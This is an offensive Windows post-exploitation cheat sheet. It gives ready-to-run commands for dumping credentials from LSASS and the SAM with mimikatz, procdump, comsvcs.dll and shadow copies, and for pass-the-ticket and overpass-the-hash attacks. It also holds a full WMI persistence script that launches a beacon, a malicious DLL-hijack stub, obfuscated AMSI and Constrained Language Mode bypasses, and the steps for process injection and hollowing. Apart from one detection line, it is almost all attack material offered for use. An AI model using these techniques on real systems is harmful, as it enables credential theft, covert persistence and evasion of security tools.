--- LSASS MEMORY DUMPING ---

LSASS (Local Security Authority Subsystem Service): Stores:
  NTLM hashes: For NTLM authentication.
  Kerberos tickets: TGTs and service tickets.
  Cleartext passwords (WDigest, legacy): Windows 7-era, sometimes still enabled.
  
MIMIKATZ (most common credential tool):
  # Requires: SeDebugPrivilege (admin or debug rights)
  
  # Dump all credentials:
  mimikatz# privilege::debug      # Enable SeDebugPrivilege
  mimikatz# sekurlsa::logonpasswords   # Dump all logon credentials
  
  # Output includes per-session:
  # Username: john.doe
  # Domain: CORPORATE
  # NTLM: aad3b435b51404eeaad3b435b51404ee    ← LM (empty/disabled)
  # NTLM: fc525c9683e8fe067095ba2ddc971889    ← NTLM hash
  # Password: (null) or cleartext if WDigest enabled
  
  # Dump Kerberos tickets:
  mimikatz# sekurlsa::tickets /export   # Export .kirbi files to disk
  
  # DCSync (no LSASS touch — uses replication protocol):
  mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
  # Returns: NT hash and AES keys of krbtgt → Golden Ticket

LSASS DUMP WITHOUT MIMIKATZ (EDR evasion):
  Method 1: Task Manager (if available)
  Right-click lsass.exe → Create dump file → C:\Windows\Temp\lsass.DMP
  Copy dump to attacker machine → Run mimikatz offline:
  mimikatz# sekurlsa::minidump lsass.DMP
  mimikatz# sekurlsa::logonpasswords
  
  Method 2: ProcDump (Sysinternals, signed Microsoft binary):
  procdump.exe -accepteula -ma lsass.exe lsass.dmp
  # Signed = less likely to be flagged. Still needs admin.
  
  Method 3: comsvcs.dll (LOLBIN):
  # MiniDump export function built into comsvcs.dll
  tasklist | findstr lsass    # Get LSASS PID (e.g., 688)
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\lsass.dmp full
  
  Method 4: Shadow Copy:
  # If Volume Shadow Copy exists: NTDS.dit + SYSTEM hive from VSS
  vssadmin list shadows
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\
  
  Method 5: Silenttrinity/PPLdump — dump protected LSASS:
  PPLdump.exe lsass.exe lsass.dmp
  # PPLdump: Bypass Process Protected Light (PPL) on LSASS.

--- SAM DATABASE ---

SAM (Security Account Manager): Local account hashes.
Located: C:\Windows\System32\config\SAM
Encrypted with: SYSTEM hive's boot key.

OFFLINE DUMP:
  reg save HKLM\SAM C:\sam.bak
  reg save HKLM\SYSTEM C:\system.bak
  # On attacker machine:
  impacket-secretsdump -sam sam.bak -system system.bak LOCAL

ONLINE DUMP (Mimikatz):
  mimikatz# lsadump::sam    # Dumps local SAM hashes

--- PASS THE TICKET ---

  # Export Kerberos tickets from Mimikatz:
  mimikatz# sekurlsa::tickets /export    # Saves .kirbi files
  
  # Import specific ticket (TGT or service ticket):
  mimikatz# kerberos::ptt Administrator@krbtgt-CORP.LOCAL.kirbi

  # Access service using ticket:

--- OVERPASS THE HASH ---

Convert NTLM hash to Kerberos TGT (useful when NTLM blocked, Kerberos allowed):
  mimikatz# sekurlsa::pth /user:Administrator /domain:CORP.LOCAL \
    /ntlm:NTLM_HASH /aes256:AES_HASH /run:PowerShell.exe
  # New process has: Administrator's identity via Kerberos.
  # klist shows: TGT for Administrator.

--- WMI EVENT SUBSCRIPTION (stealthy, no files on disk) ---

  # WMI event subscriptions persist across reboots. No startup entries. Very stealthy.
  # Requires admin.
  
  $filterName = "WindowsAuditFilter"
  $consumerName = "WindowsAuditConsumer"
  
  # Event filter: Trigger on startup (every 60 seconds since boot)
  $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
      Name = $filterName
      EventNamespace = "root\cimv2"
      QueryLanguage = "WQL"
      Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
  }
  
  # Consumer: What to run
  $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
      Name = $consumerName
      ExecutablePath = "C:\Windows\Temp\beacon.exe"
      CommandLineTemplate = "C:\Windows\Temp\beacon.exe"
  }
  
  # Binding: Connect filter to consumer
  Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
      Filter = $Filter
      Consumer = $Consumer
  }
  
  # Detection: WMI subscriptions are often missed.
  # Query to find: Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

--- DLL HIJACKING ---

  # Applications search for DLLs in specific order. If writable dir comes before system32:
  # 1. Application directory
  # 2. System32
  # 3. Windows directory
  # 4. Current directory
  # 5. PATH directories
  
  # Find missing DLLs with Process Monitor:
  # Filter: Path contains .dll, Result = NAME NOT FOUND
  # In writable path: Drop your malicious DLL with that name.
  
  # DLL export stub (to maintain app functionality):
  cat > malicious.c << 'EOF'
  #include <windows.h>
  
  BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
      if (dwReason == DLL_PROCESS_ATTACH) {
          // Persistence: Add our payload
          WinExec("C:\\Windows\\Temp\\beacon.exe", SW_HIDE);
      }
      return TRUE;
  }
  EOF

--- AMSI BYPASS (Anti-Malware Scan Interface) ---

AMSI: Windows interface that connects PowerShell/JScript/VBA to AV engines.
Every script execution: Submitted to AV via AMSI before running.
Bypass: Patch amsi.dll in memory to always return "clean."

Classic (heavily detected):
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Obfuscated modern bypass:
  $a = 'Am' + 'siU' + 'tils'
  $b = 'amsi' + 'Init' + 'Failed'
  [Ref].Assembly.GetType('System.Management.Automation.'+$a).GetField($b,'NonPublic,Static').SetValue($null,$true)

Memory patch (most reliable):
  # Patch AmsiScanBuffer function to return clean (0x80070057 = E_INVALIDARG)
  # Written in C# or via memory manipulation in PowerShell:
  # Find amsi.dll in memory, find AmsiScanBuffer, patch return value.
  # Tools: AmsiBypass.ps1, various open-source implementations.

--- POWERSHELL CONSTRAINED LANGUAGE MODE (CLM) BYPASS ---

CLM: Limits PowerShell functionality (no .NET calls, no P/Invoke, etc.).
Active when: AppLocker policy or WDAC policy is enforced.

Check: $ExecutionContext.SessionState.LanguageMode
Full Language Mode: No restrictions.
Constrained Language Mode: Restricted.

Bypasses:
  1. PowerShell v2: Fall back to old engine without CLM support.
     powershell -v 2 -exec bypass -c "whoami"
     (Only works if PS v2 is installed)
  
  2. Custom runspace: Create new PowerShell runspace from .NET (CLM applies to console, not all runspaces).
  
  3. Writable AppLocker policy location: Drop script there (allowed paths).
     Check: Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  
  4. WDAC bypass: More complex. Requires signing or finding an allowed binary.

--- PROCESS INJECTION TECHNIQUES ---

Classic CreateRemoteThread injection:
  1. OpenProcess(PROCESS_ALL_ACCESS, target_pid)
  2. VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
  3. WriteProcessMemory(hProcess, alloc_addr, shellcode, shellcode_size)
  4. CreateRemoteThread(hProcess, NULL, 0, alloc_addr, NULL, 0, NULL)
  
  EDR detection: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = strong signal.

Process Hollowing (more stealthy):
  1. Create legitimate process suspended: CreateProcess(..."svchost.exe"..., CREATE_SUSPENDED)
  2. Unmap legitimate code: NtUnmapViewOfSection(hProcess, pBaseAddr)
  3. Allocate new space: VirtualAllocEx at same base address
  4. Write malicious PE: WriteProcessMemory
  5. Set new entry point: SetThreadContext(hThread, ...)
  6. Resume: ResumeThread(hThread)
  
  Result: svchost.exe process in task list, but running attacker's code.

Early Bird injection (APC-based):
  1. Create suspended process: CreateProcess(CREATE_SUSPENDED)
  2. Allocate shellcode: VirtualAllocEx + WriteProcessMemory
  3. Queue APC: QueueUserAPC(shellcode_addr, hThread, NULL)
  4. Resume: ResumeThread
  5. First thing thread does: Runs queued APC (our shellcode).
  
  Evades: Many hooks placed AFTER thread starts. APC runs before hooks established.
